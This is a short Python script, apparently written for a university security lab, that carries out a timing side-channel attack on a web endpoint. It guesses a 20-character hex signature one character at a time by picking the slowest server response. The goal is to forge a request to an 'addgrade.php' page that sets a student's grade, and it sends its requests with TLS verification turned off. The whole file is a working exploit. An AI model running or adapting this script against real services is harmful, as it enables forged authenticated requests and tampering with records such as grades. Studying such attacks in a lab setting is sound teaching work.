#!/usr/bin/env python3

# Program for exploiting slow signature verification in websites
# WARNING: This does not always produce correct answers, please verify by the final output that body response = b\n1
# USEFUL: Performance seems to be affected by your current internet usage. Might be better to close down all internet
# activity while running (Seems to produce correct output more often while not using other services)

import requests
import time


host = 'https://eitn41.eit.lth.se'
port = '3119'
resource = '/ha4/addgrade.php?'
name = 'Pelle'
grade = '3'
signature = ''

signature_length = 20
base = 16

response_times_signature = list()
response_times_index = list()
request_time = 0
response_time = 0


# Loops each signature value, appends the slowest one to the current signature
# Exploits the fact that signatures are verified character by character
# The slowest response time means its probably correct character, thus this is appended to the signature
for i in range(signature_length):

    sig_val = 0

    for i in range(base):

        sig_val = hex(i)[2:]

        request_time = time.time()

        # SSL verification is disabled
        r = requests.get(host + ':' + port + resource + 'name=' + name + '&grade=' + grade + '&signature=' + signature + sig_val, verify=False)
        response_time = time.time()

        response_times_index.append([response_time - request_time, i])

    current_max = 0.0
    max_index = 0
    for item in response_times_index:
        if current_max < item[0]:
            current_max = item[0]
            max_index = item[1]

    # Clear or not, the slowest signature will be added anyway, so this should not affect the program
    response_times_index.clear()

    signature = signature + str(hex(max_index)[2:][:1])

    # Current signature is printed, may be interesting
    print(signature)


# Final request is done, if response = b'\n1', then the signature is correct, otherwise signature is not accepted
r = requests.get(host + ':' + port + resource + 'name=' + name + '&grade=' + grade + '&signature=' + signature, verify=False)
print(r.content)



